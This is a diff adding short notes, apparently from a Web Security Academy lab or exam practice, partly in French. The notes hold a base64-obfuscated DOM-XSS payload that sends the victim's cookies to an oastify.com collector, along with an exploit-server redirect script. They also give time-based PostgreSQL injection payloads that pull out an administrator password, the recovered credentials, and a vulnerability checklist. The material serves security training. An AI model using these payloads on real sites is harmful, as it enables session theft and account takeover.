@@ -1,0 +1,55 @@
+Active Scan => DOM-XSS => "-alert(1)-"
+
+Exploit:
+"-eval(atob('ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ=='))-"
+
+base64 part:
+fetch('https://6ho7tvv3cg9zw205wwtrac5wrnxel49t.oastify.com?cookie='+document.cookie)
+
+
+
+Exploit server:
+<script>
+    document.location="https://0a440073036c814880321c91006200af.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ==%27))-%22czichiz"
+</script>
+
+Carlos account takeover!
+
+Active scan on new advanced search feature only accessible with user account => PostgreSQL injection dans param sort-by
+
+PostgreSQL: PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit 
+
+
+Vérification:
+sort-by=DATE;SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
+
+Find password lenght:
+sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
+
+20 cars
+
+Find password:
+sort-by=DATE;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,$1$,1)='$a$')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--
+
+1234567891011121314151617181920
+b9v9whchew y p e w t l 1 y g v
+
+creds admin:
+login: administrator
+password: b9v9whchewypewtl1ygv
+
+Administrator account takeover!
+
+New feature => admin panel => delete users => list of blogs with title/author/views
+
+checklist:
+
+SQLi => possible +
+XXE => possible -
+SSRF => possible
+OS injection => possible
+Deserial => non
+File upload => non
+
+View-source => clean
+
